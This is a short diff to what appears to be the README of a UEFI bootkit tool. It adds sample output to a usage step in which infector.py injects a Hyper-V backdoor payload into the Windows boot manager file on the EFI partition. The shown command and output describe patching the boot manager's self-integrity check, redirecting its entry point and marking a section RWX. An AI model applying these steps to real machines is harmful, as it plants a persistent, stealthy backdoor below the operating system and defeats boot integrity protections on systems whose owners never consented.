@@ -147,6 +147,19 @@ Infect original image file with Hyper-V backdoor:
 C:\> python .\infector.py --patch-integrity-checks --payload .\DmaBackdoorHv_X64.efi ^ 
      --infect S:\EFI\Microsoft\Boot\bootmgfw_orig.efi ^
      --output S:\EFI\Microsoft\Boot\bootmgfw.efi
+
+[+] Target image to infect: S:\EFI\Microsoft\Boot\bootmgfw_orig.efi
+[+] Infector payload: .\DmaBackdoorHv_X64.efi
+[+] Output file: S:\EFI\Microsoft\Boot\bootmgfw.efi
+Original entry point RVA is 0x0001fbd0
+Original .reloc virtual size is 0x00000d80
+Original image size is 0x001bf000
+Characteristics of .reloc section was changed to RWX
+New entry point RVA is 0x001bfe44
+New .reloc virtual size is 0x000040a0
+New image size is 0x001c20a0
+[+] bootmgr!BmFwVerifySelfIntegrity() signature found at offset 0x0002a25c
+[+] DONE
 ```
 
 Unmount EFI system partition
